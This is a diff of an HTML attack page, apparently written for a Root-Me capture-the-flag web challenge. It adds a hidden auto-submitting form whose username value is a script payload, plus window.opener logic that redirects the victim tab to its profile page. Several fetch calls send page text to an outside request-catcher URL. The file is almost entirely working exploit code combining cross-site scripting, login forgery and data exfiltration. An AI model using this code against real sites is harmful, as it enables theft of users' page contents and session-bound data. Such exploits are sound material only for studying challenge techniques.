@@ -2,12 +2,19 @@
 
 <body>
 
+
+<form id='ooo' method="POST" action="http://challenge01.root-me.org:58003/login">
+            <input id="username" class="mgb-1" name="username" value="<script>fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + document.body.textContent, {mode: 'no-cors'})</script>"><br>
+            <input id="secret" class="mgb-1" name="secret" value="jj"><br>
+        </form>
+
 <script>
 
 
 if (window.opener) {
-	//window.opener.location.replace('http://challenge01.root-me.org:58003/profile')
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + window.opener.document.body.textContent, {mode: 'no-cors'})
+	window.opener.location.replace('http://challenge01.root-me.org:58003/profile')
+	document.getElementById('ooo').submit();
+	//fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + window.opener.document.body.textContent, {mode: 'no-cors'})
 } else {
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?noOpener=', {mode: 'no-cors'})
 }
